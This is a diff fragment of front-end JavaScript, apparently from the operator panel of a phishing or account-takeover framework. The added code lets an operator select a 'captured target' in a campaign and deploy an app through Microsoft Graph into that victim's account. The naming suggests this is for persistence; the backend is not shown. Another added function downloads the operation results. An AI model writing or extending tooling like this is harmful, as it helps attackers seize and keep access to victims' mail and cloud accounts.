+  if (!targetID || !activeCampaignID) { notify('Select a captured target first', true); return; }
+  const displayName = document.getElementById('graphAppName').value.trim();
+  const redirectURI = document.getElementById('graphAppRedirect').value.trim();
+  if (!displayName) { notify('App display name required', true); return; }
+  graphLoading('deploy-app');
+  try {
+    const r = await fetch('/api/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID) + '/deploy-app', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ display_name: displayName, redirect_uri: redirectURI })
+    });
+    const json = await r.json();
+    graphFinish('deploy-app', json);
+    if (!json.error) notify('App deployed: ' + displayName);
+  } catch(e) { graphSetOutput(`<span style="color:var(--accent2)">${escH(e.message)}</span>`); }
+}
+
+function graphDownloadResult() {
+  if (!graphLastResult) { notify('No result to download', true); return; }
+  const blob = new Blob([JSON.stringify(graphLastResult, null, 2)], {type:'application/json'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'graph_' + (graphCurrentOp||'result') + '_' + Date.now() + '.json';
+  a.click();
+  URL.revokeObjectURL(url);
 }
 
 function switchMailTab(name, btn) {
